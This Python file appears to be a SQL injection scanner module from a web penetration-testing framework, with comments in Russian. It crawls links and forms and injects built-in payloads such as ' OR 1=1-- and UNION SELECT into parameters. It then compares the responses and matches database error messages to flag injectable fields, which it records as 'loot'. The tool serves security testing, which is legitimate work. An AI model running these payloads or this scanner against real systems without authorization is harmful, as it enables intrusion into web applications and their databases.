"""SQLi по явному параметру, ссылкам и GET/POST-формам."""

from difflib import SequenceMatcher
from pathlib import Path
from types import SimpleNamespace
import re
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from core.module_base import BaseModule
from utils import renderer
from utils.concurrency import threaded_map
from utils.crawl import collect_candidates
from utils.net import parse_ports
from utils.web import WebClient, WebRequestError


SQL_ERRORS = (
    r"SQLITE_ERROR[^<\r\n]{0,160}|sqlite3?\.OperationalError[^<\r\n]{0,120}",
    r"SQL syntax.*?MySQL|Warning.*?mysql_|mysqli?_(?:query|fetch)|You have an error in your SQL syntax",
    r"PostgreSQL.*?ERROR|pg_query\(\).*?Warning|syntax error at or near",
    r"SQLite(?:3)?::|SQLite(?:Exception| error)|near\s+[\"'][^\"']+[\"']:\s*syntax error",
    r"SQLSTATE\[[\w]+\]|ODBC SQL Server Driver|Unclosed quotation mark after the character string",
    r"ORA-\d{4,5}\b|quoted string not properly terminated",
)
DEFAULT_PAYLOADS = ["'", '"', "')", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--", "')) OR 1=1--"]
BOOLEAN_PAIRS = [("' OR 1=1--", "' OR 1=2--"), ("')) OR 1=1--", "')) OR 1=2--"),
                 (" AND 1=1", " AND 1=2"), ("' AND '1'='1", "' AND '1'='2")]


def replace_parameter(url, index, value):
    parsed = urlsplit(url)
    fields = parse_qsl(parsed.query, keep_blank_values=True)
    fields[index] = (fields[index][0], value)
    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, urlencode(fields), ""))


def candidate_urls(session, explicit, client, limit):
    # Совместимость с прежними модулями и пользовательскими расширениями.
    return [candidate.url for candidate in collect_candidates(session, client, url=explicit, max_urls=limit)
            if candidate.method == "GET"]


def _normalize_body(body, reflected_values=()):
    body = body[:100_000]
    for value in sorted(set(str(value) for value in reflected_values if value), key=len, reverse=True):
        if len(value) > 2:
            body = body.replace(value, "<value>")
    return re.sub(r"\s+", " ", body).strip()


def _ratio(first, second):
    return SequenceMatcher(None, first, second, autojunk=True).ratio()


def boolean_evidence(baseline, repeat, true_response, false_response, reflected_values=()):
    if baseline.status_code != repeat.status_code or baseline.status_code != true_response.status_code:
        return False
    if not 200 <= baseline.status_code < 400 or not 200 <= false_response.status_code < 400:
        return False
    bodies = [_normalize_body(item.text, reflected_values)
              for item in (baseline, repeat, true_response, false_response)]
    return (min(map(len, bodies[:3])) >= 20 and _ratio(bodies[0], bodies[1]) >= .98
            and _ratio(bodies[0], bodies[2]) >= .97 and _ratio(bodies[2], bodies[3]) <= .80)


def _stable_pair(baseline, repeat, true, false, true_again, false_again, values):
    responses = (baseline, repeat, true, false, true_again, false_again)
    if any(not 200 <= response.status_code < 400 for response in responses):
        return False
    if baseline.status_code != repeat.status_code or true.status_code != true_again.status_code or false.status_code != false_again.status_code:
        return False
    bodies = [_normalize_body(response.text, values) for response in responses]
    if min(len(body) for body in bodies[:3]) < 20:
        return False
    size_true, size_false = len(bodies[2]), len(bodies[3])
    difference = abs(size_true - size_false) / max(1, size_true, size_false)
    return (difference >= .20 and _ratio(bodies[0], bodies[1]) >= .98
            and _ratio(bodies[2], bodies[4]) >= .98 and _ratio(bodies[3], bodies[5]) >= .98
            and _ratio(bodies[2], bodies[3]) <= .80)


def load_payloads(value, defaults, project_dir):
    if not value:
        return list(defaults)
    path = Path(str(value)).expanduser()
    if not path.is_absolute():
        path = project_dir / path
    if path.stat().st_size > 1024 * 1024:
        raise ValueError("Файл payloads превышает1MiB")
    payloads = [line.strip() for line in path.read_text(encoding="utf-8").splitlines()
                if line.strip() and not line.lstrip().startswith("#")]
    if not payloads:
        raise ValueError("Файл payloads пуст")
    return list(dict.fromkeys(payloads))[:128]


def web_session(module):
    services = dict(module.session.services)
    ports = module.get_option("ports") if "ports" in module.options else ""
    if ports:
        for port in parse_ports(str(ports)):
            services[port] = {"name": "https" if port in {443, 8443} else "http"}
    return SimpleNamespace(target=module.session.target, services=services,
                           params=module.session.params, loot=module.session.loot)


class SQLiModule(BaseModule):
    name = "sqli"
    category = "web"
    description = "SQLi: явные параметры, ссылки, GET/POST-формы"
    options = {
        "url": {"default": "", "required": False, "description": "Базовый URL; при crawl URL веб-сервисов сессии"},
        "param": {"default": "", "required": False, "description": "Явный параметр, например q"},
        "method": {"default": "GET", "required": False, "description": "GET или POST для явного параметра"},
        "payloads_file": {"default": "", "required": False, "description": "Свой список payloads вместо встроенного"},
        "crawl": {"default": True, "required": False, "description": "Искать параметры в ссылках и формах"},
        "ports": {"default": "", "required": False, "description": "Веб-порты для one-shot"},
        "max_urls": {"default": 10, "required": False, "description": "Лимит кандидатов и страниц обхода"},
        "max_depth": {"default": 1, "required": False, "description": "Глубина обхода"},
        "max_parameters": {"default": 10, "required": False, "description": "Максимум полей одного кандидата"},
        "boolean": {"default": True, "required": False, "description": "Проверять повторяемую true/false-пару"},
        "threads": {"default": 8, "required": False, "description": "Параллельная проверка параметров (1–64)"},
        "verify": {"default": True, "required": False, "description": "Проверять HTTPS-сертификат"},
    }

    def run(self):
        rows = []
        payloads = load_payloads(self.get_option("payloads_file"), DEFAULT_PAYLOADS, self.project_dir)
        stats = {"candidates": 0, "tested": 0, "findings": 0}
        self.session.params.setdefault("scan_stats", {})["sqli"] = stats
        param = str(self.get_option("param") or "")
        threads = max(1, min(64, int(self.get_option("threads"))))
        with WebClient(timeout=self.get_option("timeout"), verify=self.get_option("verify")) as client:
            candidates = collect_candidates(web_session(self), client, url=self.get_option("url") or None,
                param=param or None, method=self.get_option("method"), crawl=self.get_option("crawl"),
                max_urls=self.get_option("max_urls"), max_depth=self.get_option("max_depth"))
            # Базовый ответ берём один раз на кандидата, затем параметры проверяем параллельно.
            tasks = []
            for candidate in candidates:
                indexes = [index for index, (name, _) in enumerate(candidate.params) if not param or name == param]
                indexes = indexes[:max(1, min(50, self.get_option("max_parameters")))]
                if not indexes:
                    continue
                try:
                    baseline = candidate.send(client)
                except WebRequestError as exc:
                    renderer.print_warn(str(exc))
                    continue
                stats["candidates"] += len(indexes)
                for index in indexes:
                    tasks.append((candidate, index, baseline))

            def probe(task):
                candidate, index, baseline = task
                value = candidate.params[index][1]
                return self._check(client, candidate, index, value, baseline, payloads)

            for task, result, error in threaded_map(probe, tasks, threads):
                stats["tested"] += 1
                if error is not None:
                    renderer.print_warn(str(error))
                    continue
                if not result:
                    continue
                candidate, index, _ = task
                name = candidate.params[index][0]
                detection, payload, evidence = result
                stats["findings"] += 1
                rows.append((candidate.url, name, candidate.method, payload, evidence))
                self.session.add_finding(f"Possible SQL injection: {name} ({detection})", candidate.url,
                    severity="high", parameter=name, method=candidate.method, payload=payload, evidence=evidence,
                    detection=detection, module=self.path)
                self.session.add_loot("finding", f"SQLi candidate: {name} ({detection})", candidate.url)
        renderer.print_table("SQLi findings", ["URL", "Parameter", "Method", "Payload", "Evidence"], rows)
        renderer.print_info(f"Кандидатов: {stats['candidates']}, проверено: {stats['tested']}, уязвимостей: {stats['findings']}")

    def _check(self, client, candidate, index, value, baseline, payloads):
        existing = {pattern for pattern in SQL_ERRORS if re.search(pattern, baseline.text, re.I | re.S)}
        for payload in payloads:
            try:
                response = candidate.send(client, index, payload)
            except WebRequestError as exc:
                renderer.print_warn(str(exc))
                continue
            for pattern in SQL_ERRORS:
                match = re.search(pattern, response.text, re.I | re.S)
                if match and pattern not in existing:
                    return "error-based", payload, match.group(0)[:160]
        if not self.get_option("boolean"):
            return None
        try:
            repeat = candidate.send(client)
        except WebRequestError as exc:
            renderer.print_warn(str(exc))
            return None
        for true_payload, false_payload in BOOLEAN_PAIRS:
            true_value, false_value = value + true_payload, value + false_payload
            try:
                true = candidate.send(client, index, true_value)
                false = candidate.send(client, index, false_value)
                values = (value, true_value, false_value)
                is_and = " AND " in true_payload
                if is_and and not boolean_evidence(baseline, repeat, true, false, values):
                    continue
                if not is_and and (true.status_code != false.status_code or not 200 <= true.status_code < 400):
                    continue
                true_again = candidate.send(client, index, true_value)
                false_again = candidate.send(client, index, false_value)
            except WebRequestError as exc:
                renderer.print_warn(str(exc))
                continue
            valid = (boolean_evidence(baseline, repeat, true_again, false_again, values) if is_and
                     else _stable_pair(baseline, repeat, true, false, true_again, false_again, values))
            if valid:
                evidence = (f"boolean-based: stable pair, bytes={len(true.content)}/{len(false.content)}, "
                            f"Content-Length={true.headers.get('content-length', '?')}/{false.headers.get('content-length', '?')}")
                return "boolean-based", true_value, evidence
        return None


SQLi = SQLiModule
